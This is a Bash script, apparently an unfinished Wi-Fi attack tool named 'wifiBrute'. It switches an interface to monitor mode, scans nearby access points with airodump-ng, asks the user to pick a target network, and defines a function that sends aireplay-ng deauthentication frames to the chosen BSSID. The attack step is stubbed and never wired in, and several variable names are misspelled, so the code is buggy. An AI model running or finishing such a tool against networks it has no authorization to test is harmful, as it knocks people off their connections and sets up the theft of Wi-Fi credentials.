
# 
resize -s 34 105 > /dev/null
#
# colors
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color



#
#
os=$(uname)
homepath=$(echo ~)
user=$(who | cut -d ' ' -f1 | sort | uniq)
interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')

function banner () {
    echo "                            
       _ ___ _ _____         _       
 _ _ _|_|  _|_| __  |___ _ _| |_ ___ 
| | | | |  _| | __ -|  _| | |  _| -_|
|_____|_|_| |_|_____|_| |___|_| |___|                              
Layvth@Github
"
}
#////////////////////////////// airodump-ng running for get access AP //////////////


run_airodump() {
    local interface=$1
    echo -e "${GREEN}[+]~: ${NC}Scanning for Wi-Fi networks on interface $interface..."
    echo -e "${YELLOW}[+]~: When you Finish Scaning Press [Ctrl + c]"
    xterm -geometry 100x50 -e "airodump-ng $interface --output-format csv -w outputfile"
    filter_info outputfile-01.csv 
}

filter_info() {
    rm final_result.txt
    local input_file=$1
    local output_file="ap_info.csv"
    # Filtering important columns: BSSID, ESSID, Channel, Encryption
    awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
    echo -e "${GREEN}[+]~: ${NC}Filtered information saved in $output_file"
    cat ap_info.csv | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
    rm ap_info.csv
    rm outputfile-01.csv
    choseTargetAp final_result.txt
}

sendDeauth () {
  local bssid=$1
  local interface=$2
  aireplay-ng --deauth 50 -a $bassid $interface
}

# Function to print table headers

choseTargetAp () {
   # Read input line by line from the file
    local input_file=$1
    # Parse the file using awk to handle variable lines and print in tabular format
    awk -F ", " '
        BEGIN {
            # Set column widths and print top border
            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
            # Print header
            printf "| %-4s | %-17s | %-6s | %-18s | %-10s | %-10s |\n", "Line", "MAC Address", "Channel", "ESSID", "Security", "Encryption"
            # Print divider
            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
            line=0
        }
        {
            line++
            # Print each field with proper formatting
            printf "| %-4s | %-17s | %-6s | %-18s | %-10s | %-10s |\n", line, $1, $2, $3, $4, $5
        }
        END {
            # Print bottom borderls
            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
        }' "$input_file"
    total_lines=$(wc -l < "$input_file")
    while true; do
      if [ "$total_lines" -eq "0" ]; then
        echo -e "${RED}[!] ${NC}No networks found. try to run script Again"
        break
      elif [ "$total_lines" -eq "1" ]; then
        echo "Choosing the default one."
        break
      else
        read -p "Set target Network Number: " targetAp
        if [ "$targetAp" -le "$total_lines" ] && [ "$targetAp" -gt "0" ]; then >> /dev/null
            startAttacking "$targetAp" "$input_file"
            break
        else
          echo "Error"
        fi
      fi
    done
}
startAttacking () {
    local lineNum=$1
    local fileAps=$2
    local filtered=$(sed -n "${lineNum}p" "$fileAps")
    
    local targetAp=$(echo "$filtered" | awk '{print $3}')
    local targetBSSID=$(echo "$filtered" | awk '{print $1}')
    local targetChannel=$(echo "$filtered" | awk '{print $2}')

    echo "$targetAp"
    


}







check_monitor_mode_support() {
    # Check if the phy80211 directory exists for the interface
    if [ -d "/sys/class/net/$interface/phy80211" ]; then
        sleep 0.4
        echo -e "${GREEN}[*]~: ${NC}Interface ($interface) supports monitor mode !"o
        sleep 1
        mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
        if [ "$mode" = "Mode:Monitor" ]; then
            echo -e "${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
            checkTools
        else
            read -p "    | Switch ($interface) to monitor mode (y/n) >  " response
            if [ "$response" == "yes" ] || [ "$response" == "y" ]; then
                sleep .7
                airmon-ng start $interface >> /dev/null
                sleep .5
                echo -e "${GREEN}[*]~:${NC}$infterface Switched to monitor mode !"
                sleep 1
                checkTools
            fi
        fi
        
    else
        echo -e "${RED}[!]~:${NC} Interface ($interface) does not support monitor mode"
        sleep .7
        echo -e "${RED}[!]~:${NC} Error : check your interface !${NC}"
        
        exit 1
    fi
}

ctrl_c () {
    echo "exiting"
    if iwconfig $interface | grep -q "Mode:Monitor"; then
        read -p "[*]~: Do you want to exit from Monitor mode (yes/no) : " check
        if [ "$check" == "yes" ] || [ "$check" == "y" ]; then
            echo $interface
            ifconfig $infterface down
            iwconfig $infterface mode managed
            ifconfig $infterface up
            echo "[*]~: Exiting from monitor Mode !"
            exit 1
        else
            echo "[*]~: Exit !"
            exit 1
        fi
    else
        echo "[*]~: Exit !"
        exit 1
    fi
}

trap ctrl_c SIGINT

# check for root permetion
checkRoot () { 
    if [ "$(id -u)" != "0" ]; then
        echo "[!] We need root permition !"
        echo "[+] Try run with [ sudo ./wifiBrute.sh] "
    else 
        clear
        banner
        check_monitor_mode_support
    fi
} 


checkTools() {
    echo -e "${GREEN}[+]~:${NC} Tools checking~:"
    tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
    tools_found=0
    for tool in "${tools[@]}"; do
        tool_path=$(which "$tool")
        if [ "$?" -ne "0" ]; then
            echo -e "${RED}[ Not Found ] ${NC}$toos"
            echo "[!] try [ apt-get install $tool ] "
        else 
            sleep 0.4
            echo -e "${GREEN}[ Found ]~: ${NC}$tool"
            ((tools_found+=1)) # Increment the counter if the tool is found
        fi
    done
    if [ "$tools_found" -eq "${#tools[@]}" ]; then
        run_airodump $interface
    else
        echo -e "${RED}Some required tools were not found.${NC}"
        exit 1
    fi
}



checkRoot
